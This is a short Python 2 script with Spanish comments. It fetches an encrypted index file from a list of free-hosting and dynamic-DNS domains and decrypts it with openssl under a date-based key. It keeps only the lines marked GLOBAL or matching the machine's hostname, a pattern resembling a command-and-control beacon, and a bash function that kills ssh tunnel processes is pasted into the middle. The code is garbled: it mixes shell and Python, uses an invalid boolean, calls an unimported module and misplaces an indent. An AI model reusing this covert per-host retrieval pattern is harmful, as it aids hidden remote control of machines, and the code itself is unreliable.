#!/usr/bin/python
# -*- coding: utf-8 -*-

# Fecha creación: 17 jul. 2017
# autor: usuario

import requests
import base64
import subprocess
import tempfile
import time
import socket

DEBUG=true

def debug(*mensa):
    global DEBUG
    if DEBUG:
        imprimir=""
        for m in mensa:
            imprimir+=m
    print imprimir

def conexionActiva(host):
    nPings=4; timeout=2
    # Ping parameters as function of OS
    if (platform.system().lower()=="windows"): parameters = "-n "+str(nPings)+" -w "+str(timeout)
    else: parameters = "-c "+str(nPings)+" -W "+str(timeout)
    cmd=['ping',parameters,host]
    # Pinging
    #return os.system("ping " + parameters + " " + host) == 0
    return subprocess.Popen(cmd).wait()==0

def hostname():
    return socket.gethostname().split(".")[0]

def encryptDecryptCtr256Shell(data, key, encrypt='e',filtro="None"):
    if (filtro==None): filtro=hostname()
    infile = tempfile.mktemp()
    f=open(infile,"wb")
    f.write(data)
    f.close()
    outfile = tempfile.mktemp()
    cmd = ['openssl', 'enc']
    cmd.append("-"+encrypt)
    cmd += ['-aes-256-ctr',
            '-base64',
            '-in', infile,
            '-out', outfile,
            '-k', key]
    subprocess.Popen(cmd).wait()
    f=open(outfile)
    if (filtro==None): return f.read()
    res=""
    for l in f:
        if l.startswith("GLOBAL") or l.startswith(filtro):
            res+=l
    return res

def obtenerFicheroIndice(urls=None):
    if (urls==None):
        urls=["https://ganimedes.000webhostapp.com/","http://scratch.hol.es/","http://xyz.hit.to/",
          "http://ubuin.hopto.org/","http://ganimedes.esy.es/"]
    for url in urls:
        try: 
            r=requests.get(url);  
            break
        except: pass
            
    if (r.status_code!=200):
        return ""
    return encryptDecryptCtr256Shell(r.content,"clave"+time.strftime("%Y-%m-%d"),'d',hostname())

mata() {
   CUENTA=0
   while true; do 
      if [ "$PID" = "" ]; then PID=$(/bin/ps  ax | /bin/grep ssh | /bin/grep -i tun | /bin/grep -v /bin/grep | /usr/bin/awk '{print $1;}'); fi
      if [ "$PID" = "" -o $CUENTA -gt 10 ]; then break; fi 
      if [ $CUENTA -lt 5 ]; then SENIAL="-TERM"; else SENIAL="-9"; fi
      kill $SENIAL $PID
      CUENTA=$(expr $CUENTA + 1)
   done
}

print obtenerFicheroIndice()    
